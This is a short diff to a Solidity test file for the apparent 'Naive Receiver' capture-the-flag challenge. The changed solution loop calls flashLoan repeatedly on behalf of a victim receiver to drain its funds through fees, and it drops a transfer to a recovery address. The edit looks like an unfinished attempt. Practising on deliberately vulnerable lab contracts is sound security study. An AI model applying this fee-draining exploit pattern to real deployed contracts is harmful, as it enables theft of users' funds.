@@ -83,12 +83,10 @@ contract NaiveReceiverChallenge is Test {
         // for(let i = 0; i < 10; i++){
         //     await pool.connect(player).flashLoan(receiver.address, ETH, 0, "0x");
         // @audit-info hardhat to foundry
-        for(uint256 i = 0; i < 10; i++) {
-            FlashLoanReceiver receiverPool = new FlashLoanReceiver(address(pool));
-            receiverPool.onFlashLoan(player, address(weth), 0, 1, "");
+        for(uint256 i = 0; i <= 10; i++) {
+            NaiveReceiverPool receiverPool = new NaiveReceiverPool(address(pool), payable(weth), deployer);
+            receiverPool.flashLoan(receiver, address(weth), 0, "");
         }
-        weth.transfer(address(recovery), WETH_IN_POOL + WETH_IN_RECEIVER);
-        //demo
 
     }
 
